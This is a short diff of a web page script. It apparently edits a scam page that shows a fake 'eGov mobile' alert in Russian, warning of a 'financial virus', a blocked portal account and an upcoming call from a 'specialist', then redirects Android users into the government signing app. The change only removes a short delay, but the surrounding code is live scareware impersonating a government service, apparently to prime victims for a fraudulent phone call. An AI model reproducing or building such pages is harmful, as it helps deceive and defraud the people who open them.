@@ -182,7 +182,6 @@ console.log(getDeviceInfo());
       await wait(1000);
       alert('⚠️eGov mobile: Внимание! Зафиксирован финансовый вирус. Доступ к порталу временно заблокирван. Ожидайте звонок специалиста')
 
-      await wait(500);
       window.location = "intent://#Intent;scheme=mgovsign;package=kz.mobile.mgov;end";
 
       if (navigator.userAgent.match(/Android/i)) {
@@ -204,6 +203,7 @@ console.log(getDeviceInfo());
 
 
 </html>
+
 
 
 
